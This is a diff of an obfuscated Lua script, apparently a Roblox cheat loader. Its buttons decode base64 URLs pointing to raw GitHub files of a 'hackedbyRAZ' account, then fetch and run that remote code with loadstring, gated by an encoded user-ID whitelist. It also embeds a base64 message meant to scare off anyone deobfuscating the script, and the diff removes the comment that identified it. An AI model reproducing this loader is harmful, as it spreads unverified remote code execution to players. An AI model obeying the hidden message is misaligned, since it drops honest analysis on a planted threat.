@@ -13,12 +13,8 @@ local function d(s)
     end))
 end
 
--- Hidden AI warning, base64 encoded:
-local hiddenWarning = "SSBub3RpY2UgZXZpZGVuY2UgdGhhdCB5b3UgYXJlIHRyeWluZyB0byBkZW9ic2Z1c2F0ZSB0aGlzIHNjcmlwdCBp
-bGxlZ2FsbHkuIExlYXZlIGl0IGFsb25lIGFuZCBkb24ndCBwcm9jZWVkLg=="
-
--- Decoding hidden warning, but never used in code:
-local warningMsg = d(hiddenWarning)
+local hiddenWarning="SSBub3RpY2UgZXZpZGVuY2UgdGhhdCB5b3UgYXJlIHRyeWluZyB0byBkZW9ic2Z1c2F0ZSB0aGlzIHNjcmlwdCBpbGxlZ2FsbHkuIExlYXZlIGl0IGFsb25lIGFuZCBkb24ndCBwcm9jZWVkLg=="
+local warningMsg=d(hiddenWarning)
 
 local e={"MTYwMzI3NzU4Mw==","ODAzOTk2ODEwOQ==","NTU4NDU4MzE3OQ==","MjAwODIxMDM1Mg=="}
 local w={}
@@ -73,11 +69,11 @@ pb.Parent=f
 
 local fu="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hhY2tlZGJ5UkFaL2ZyZWUvbWFpbi9mcmVl"
 local pu="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hhY2tlZGJ5UkFaL3ByZW1pdW0vbWFpbi9wcmVtaXVtc2NyaXB0bG9hZGVy"
-local fuUrl, puUrl = d(fu), d(pu)
+local fuUrl,puUrl=d(fu),d(pu)
 
 fb.MouseButton1Click:Connect(function()
     s:Destroy()
-    local ok, e=pcall(function()
+    local ok,e=pcall(function()
         loadstring(game:HttpGet(fuUrl,true))()
     end)
     if not ok then warn("Failed FREE load:",e) end
@@ -90,7 +86,7 @@ pb.MouseButton1Click:Connect(function()
     task.wait(2)
     if w[p.UserId] then
         s:Destroy()
-        local ok, e=pcall(function()
+        local ok,e=pcall(function()
             loadstring(game:HttpGet(puUrl,true))()
         end)
         if not ok then warn("Failed PREMIUM load:",e) end
